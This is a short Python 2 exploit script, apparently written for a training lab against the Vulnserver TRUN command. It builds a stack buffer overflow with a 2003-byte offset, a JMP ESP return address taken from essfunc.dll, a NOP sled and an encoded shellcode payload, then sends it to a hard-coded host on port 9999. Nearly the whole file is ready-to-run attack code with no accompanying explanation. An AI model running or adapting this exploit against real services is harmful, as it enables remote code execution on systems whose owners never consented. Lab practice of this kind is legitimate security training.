#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 2003
#625011AF   FFE4    JMP ESP, essfunc.dll

buf =  ""
buf += "\xda\xd4\xbb\xd3\x50\xf1\x70\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17\x83\x14\x54\x13"
buf += "\x85\x66\xbd\x51\x66\x96\x3e\x36\xee\x73\x0f\x76\x94"
buf += "\xf0\x20\x46\xde\x54\xcd\x2d\xb2\x4c\x46\x43\x1b\x63"
buf += "\xef\xee\x7d\x4a\xf0\x43\xbd\xcd\x72\x9e\x92\x2d\x4a"
buf += "\x51\xe7\x2c\x8b\x8c\x0a\x7c\x44\xda\xb9\x90\xe1\x96"
buf += "\x01\x1b\xb9\x37\x02\xf8\x0a\x39\x23\xaf\x01\x60\xe3"
buf += "\x4e\xc5\x18\xaa\x48\x0a\x24\x64\xe3\xf8\xd2\x77\x25"
buf += "\x31\x1a\xdb\x08\xfd\xe9\x25\x4d\x3a\x12\x50\xa7\x38"
buf += "\xaf\x63\x7c\x42\x6b\xe1\x66\xe4\xf8\x51\x42\x14\x2c"
buf += "\x07\x01\x1a\x99\x43\x4d\x3f\x1c\x87\xe6\x3b\x95\x26"
buf += "\x28\xca\xed\x0c\xec\x96\xb6\x2d\xb5\x72\x18\x51\xa5"
buf += "\xdc\xc5\xf7\xae\xf1\x12\x8a\xed\x9d\xd7\xa7\x0d\x5e"
buf += "\x70\xbf\x7e\x6c\xdf\x6b\xe8\xdc\xa8\xb5\xef\x23\x83"
buf += "\x02\x7f\xda\x2c\x73\x56\x19\x78\x23\xc0\x88\x01\xa8"
buf += "\x10\x34\xd4\x7f\x40\x9a\x87\x3f\x30\x5a\x78\xa8\x5a"
buf += "\x55\xa7\xc8\x65\xbf\xc0\x63\x9c\x28\xe5\x78\x9e\xa3"
buf += "\x91\x7c\x9e\xb2\xda\x08\x78\xde\x0c\x5d\xd3\x77\xb4"
buf += "\xc4\xaf\xe6\x39\xd3\xca\x29\xb1\xd0\x2b\xe7\x32\x9c"
buf += "\x3f\x90\xb2\xeb\x1d\x37\xcc\xc1\x09\xdb\x5f\x8e\xc9"
buf += "\x92\x43\x19\x9e\xf3\xb2\x50\x4a\xee\xed\xca\x68\xf3"
buf += "\x68\x34\x28\x28\x49\xbb\xb1\xbd\xf5\x9f\xa1\x7b\xf5"
buf += "\x9b\x95\xd3\xa0\x75\x43\x92\x1a\x34\x3d\x4c\xf0\x9e"
buf += "\xa9\x09\x3a\x21\xaf\x15\x17\xd7\x4f\xa7\xce\xae\x70"
buf += "\x08\x87\x26\x09\x74\x37\xc8\xc0\x3c\x49\x38\xd8\xa8"
buf += "\xde\xe3\x89\x90\x82\x13\x64\xd6\xba\x97\x8c\xa7\x38"
buf += "\x87\xe5\xa2\x05\x0f\x16\xdf\x16\xfa\x18\x4c\x16\x2f"

buffer="TRUN /.:/" + "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*16 + buf + "C"*(5009 - 2007 - 16 - len(buf))

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()

